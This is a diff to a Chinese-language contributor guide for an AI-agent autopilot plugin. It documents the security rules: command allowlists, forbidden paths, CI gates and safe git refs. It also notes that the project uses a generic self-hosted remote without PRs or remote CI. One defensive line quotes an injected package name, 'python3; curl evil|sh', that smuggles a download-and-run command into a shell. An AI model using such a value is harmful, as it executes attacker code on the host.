@@ -63,7 +63,7 @@ src/
   preset.ts       `autopilot-team` agent 预设的落盘（ensureAutopilotTeamPreset，缺失才拷贝、绝不覆盖、失败静默）
   profile.ts      项目画像适配器：按不同协作约定（AgentDeploy 等）覆盖默认分支/PR 策略/合并方式/质量门
   cache.ts        构建缓存共享：把 .nuxt/.output 等产物按分支符号链接复用（可选、尽力而为）
-  github.ts       GitHub REST 适配层：为任务分支 upsert PR、查询 commit 的 CI 状态
+  github.ts       GitHub REST 适配层：为 github 平台任务分支 upsert PR、查询 commit 的 CI 状态（仅 github 用；generic 自建远端 `pr_sync` 退化为纯推送、不建 PR/不查 CI）
   client/         Web 端：面板、设置卡片、i18n 字典、样式、宿主契约（React 18，CJS 产物）
 preset/
   autopilot-team/ 插件自带的 agent preset 模板（agent.cordis.yml + preset.yml），随包发布，运行时拷到用户级预设根
@@ -106,8 +106,8 @@ tests/            helpers.ts（真 git fixture）+ integration / unattended / no
    - 重定向与 glob（`>`、`*`）**继续放行**：它们由同一个 shell 处理、不启动新进程，拦下来只打断正常配置而无安全收益。
    - `bootstrap.systemPackages` 会被拼进 `packageManagerCommand` 之后交给 shell，所以**每个包名都要过 `PACKAGE_NAME_RE`** —— 少了这步，`['python3; curl evil|sh']` 就让 pm 的白名单校验形同虚设（实测确认过它真的会执行）。
    - ⚠️ 仍然成立的事实：清单里有 `sh` / `node` / `ssh` / `docker` 时，白名单就等价于没开（`node -e` 即任意执行）。这道定位是**防人误配 + 留审计痕迹**，不是防一个已被注入的模型。
-3. **forbiddenPaths**：任何改动落地前都要查分支相对基线的 diff，三条路径共用 `assertNoForbiddenChanges`：`pr_sync`（比 `origin/base`）、reviewer approve（比本地 base）、`team_branch` 的 merge（比 target）。触及禁区直接拒绝并升级；**基线或源 ref 解析不出来时拒绝并升级，绝不静默放行**。默认禁区现在只剩 `['LICENSE']`（2026-08-29 变更，`AGENTS.md` / `.github/` 已移出）。⚠️ 移出 `.github/` 的代价与应对见 README「安全模型」3：需要硬保证的项目自己把它配回 `security.forbiddenPaths`。
-4. **门不过不合并**：`pushRequiresGates` 时门红禁 push/approve；`requireCiGreen` 是**另一道独立的门**（不再被 `pushRequiresGates` 短路），且 `ciStatus === null`（从未 `pr_sync`）视为未验证 → 禁 approve。注意：CI 状态仅 github 平台查得到（其它平台 `pr_sync` 恒置 `unknown`、该门自动不强制），非 github 仓库请显式关掉 `requireCiGreen`。
+3. **forbiddenPaths**：任何改动落地前都要查分支相对基线的 diff，三条路径共用 `assertNoForbiddenChanges`：push 自建远端（generic 下 `team_branch`/成员分支 push，比 `origin/base`）、reviewer approve（比本地 base）、`team_branch` 的 merge（比 target）——`pr_sync` 走的是 github 平台建 PR 的专用路径，本项目自建远端本地合并不用。触及禁区直接拒绝并升级；**基线或源 ref 解析不出来时拒绝并升级，绝不静默放行**。默认禁区现在只剩 `['LICENSE']`（2026-08-29 变更，`AGENTS.md` / `.github/` 已移出）。⚠️ 移出 `.github/` 的代价与应对见 README「安全模型」3：需要硬保证的项目自己把它配回 `security.forbiddenPaths`。
+4. **门不过不合并**：`pushRequiresGates` 时门红禁 push/approve；`requireCiGreen` 是**另一道独立的门**（不再被 `pushRequiresGates` 短路），且 `ciStatus === null`（从未 `pr_sync`）视为未验证 → 禁 approve。注意：CI 状态仅 github 平台查得到（其它平台 `pr_sync` 恒置 `unknown`、该门自动不强制），非 github 仓库请显式关掉 `requireCiGreen`——本项目即自建远端（generic），`requireCiGreen` 置 `false`，本地合并不依赖远端 CI。
 5. **禁止破坏性 git**：不 force-push 共享分支（任务/成员分支仅限 `--force-with-lease`）、不 reset 共享分支、不删 base 分支。所有可变 git 操作（create / checkout / merge / delete / push）的分支名一律过 `assertSafeRef`：不得以 `-` 开头、不得含空格或 `..`，否则模型传一个 `-D` 就能把 `git branch -D <同事的任务分支>` 拼进 argv 静默删分支。
 6. **工单凭据只活在人手里**：token 存在 service 侧旁路表（`state.json.ticketTokens`，**内部记录字段**，不是视图字段 —— 所以 `stateVersion` 不动），只拼进邮件 / webhook 的文案。任何人往 `EscalationView` / `QuestionnaireView` / 投影上加 token 字段都是在把「谁能答这张工单」写进谁都能抄一份的地方，`tests/test-notification.ts` 会红。三个失败分支（未知 id / 缺凭据 / 围栏不过）**必须返回逐字节相同的 404**，绝不 403 —— 差别一旦不同，工单号就能被枚举。独立端口 `host` 非回环 → 启动即抛，不降级继续。⚠️ 诚实边界：同源信任围栏挡的是端口扫描、跨站表单和 DNS rebinding，**挡不住本机进程和已被注入的 agent**（与硬规则 2 同一定位）。
 
@@ -161,7 +161,7 @@ tests/            helpers.ts（真 git fixture）+ integration / unattended / no
 | 新增 `EscalationReason` | `vocab.ts` 的 `ESCALATION_REASONS` → 字典 `reason.*`；⚠️ 先确认服务端真会产出它，无人产出的分类只会给模型多一个错选项 |
 | 新增 Config 字段 | `index.ts` 的 `Config` 接口与 schema → `service/options.ts` 的 `AutopilotOptions` → `apply()` 的映射 → README 配置块 → 需要时 `client/settings-card.tsx` |
 | 改 `profile.ts` 的约定 | 服务端默认值可能与 `ProjectProfile` 分叉，改前先核对 `README` 的 AgentDeploy 说明 |
-| 新增远端平台/PR 能力 | `github.ts` 适配层是否覆盖该平台 → `vocab.ts` 的 `CI_STATUSES` 与 `REMOTE_PLATFORMS`；⚠️ 类型三处（index.ts 接口 / options.ts）已由 `RemotePlatform` 单源，但 zod 侧的 `z.const` 字面量列表因 schemastery 无 enum 组合器仍需手动同步；且非 github 无 CI 查询实现 |
+| 新增远端平台/PR 能力 | `github.ts` 适配层是否覆盖该平台 → `vocab.ts` 的 `CI_STATUSES` 与 `REMOTE_PLATFORMS`；⚠️ 类型三处（index.ts 接口 / options.ts）已由 `RemotePlatform` 单源，但 zod 侧的 `z.const` 字面量列表因 schemastery 无 enum 组合器仍需手动同步；且非 github 无 CI 查询实现（本项目部署 generic 自建远端即走这条降级：无 PR/无远端 CI） |
 | 改工单路由 / 题面与答案形状 | 前缀常量只有 `vocab.ts` 的 `TICKET_ROUTE_PREFIX` 一份（服务端与面板各自 import，写死两份必漂移）→ `ticket-handler.ts` 的前缀剥离与锚死正则 → 面板与服务端表单共用 `src/formmodel.ts`（改控件形态两边一起变）→ 面向人的文案 zh/en **同时**加 |
 | 移动 / 重命名 `.md` 文档 | 全仓库 grep 旧文件名并逐处改引用（README、`.tasks/*.md` 契约、`src/` 注释、`*.patch.yml`）；放哪儿、怎么命名见「文档规范」 |
 
